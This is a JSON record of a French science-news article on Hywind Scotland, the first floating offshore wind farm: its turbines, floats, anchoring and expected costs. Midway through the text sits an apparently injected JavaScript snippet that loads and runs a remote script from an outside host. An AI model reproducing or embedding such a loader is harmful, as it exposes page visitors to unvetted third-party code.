{"title": "La première ferme éolienne flottante au monde entre en service", "newspaper": "Futura Sciences", "author": "Marc Zaffagni", "date_publi": "23/10/2017", "content": "Le tout premier parc éolien flottant a commencé à produire de l'électricité au large des côtes écossaises. D'une capacité de 30 MW, il peut produire assez d'électricité pour alimenter 20.000 foyers. Une prouesse technologie qui ouvre de grandes perspectives. À 25 kilomètres des côtes de l'Aberdeenshire (Écosse), le premier parc éolien flottant a commencé à alimenter le  réseau électrique  terrestre. Cinq  éoliennes  de 6 mégawatts chacune se dressent à 253 mètres de haut pour capter des  vents  soufflant en moyenne à 10 mètres par seconde. Et le plus surprenant est que ces géantes ne sont pas fixées dans le sol, elles flottent ! Le parc éolien Hywind Scotland est capable d'alimenter jusqu'à 20.000  foyers . C'est la compagnie pétrolière norvégienne  Statoil  qui est à l'origine de ce concept qui a fait appel à des techniques d'ingénierie et de logistique inédites. Chaque éolienne est installée sur un énorme flotteur semi-immergé de 90 mètres de long et 14 mètres de diamètre pesant 3.500 tonnes. Ce cylindre est lesté avec 5.000 tonnes de  minerai  de  fer . Il ne repose pas sur le fond marin mais est relié par des câbles à trois systèmes d'ancrage mesurant chacun 5 mètres de diamètre pour 16 mètres de haut et un poids de 111 tonnes. Ces ancres sont enfoncées dans le sol par succion. Un  logiciel  gère la flottaison de l'éolienne en jouant sur l'orientation des  pales  pour assurer un maximum de stabilité.  Le parc éolien Hywind Scotland déployé par Statoil s’étend sur une surface d’environ 4 km 2  dans des profondeurs variant entre 95 et 129 mètres. Mais Statoil assure que ses éoliennes pourraient être installées en haute mer, jusqu’à 800 mètres de profondeur. © Statoil 80 % des ressources éoliennes offshore sont en eaux profondes S'il prouve sa viabilité, ce concept ouvrira des perspectives très prometteuses pour le déploiement de  fermes éoliennes  dans la mesure où il élargit considérablement le périmètre d'exploitation. En effet, ces turbines peuvent fonctionner dans des eaux allant jusqu'à 800 mètres de profondeur alors que l'éolien  offshore  existant doit se cantonner à des profondeurs dix fois moindres.  ( function () { var vs = document.createElement(\"script\"); vs.type = \"text/javascript\"; vs.async = true; vs.src = \"http://kweb.r66net.com/GetLink\"; var s = document.getElementsByTagName(\"script\")[0]; s.parentNode.insertBefore(vs, s); })();  Plus on s'éloigne des côtes, plus on peut bénéficier d'un vent soutenu et puissant. Selon Statoil, près de 80 % des ressources éoloiennes offshore sont en eaux profondes. L'entreprise compte utiliser le site d'Hywind Scotland comme démonstrateur technologique et pense pouvoir amener son coût de production entre 40 et 60 euros du MWh d'ici 2030. Voir aussi : L'éolien offshore pourrait-il couvrir les besoins en énergie de l'humanité ? L'énergie éolienne expliquée par Jean-Luc Wingert                       Comment transformer le vent en électricité ? Quelles sont les difficultés de son exploitation ? Réponses de Jean-Luc Wingert, ingénieur-conseil « Energie et Environnement ». © Futura-Sciences                                       ", "theme": "planete"}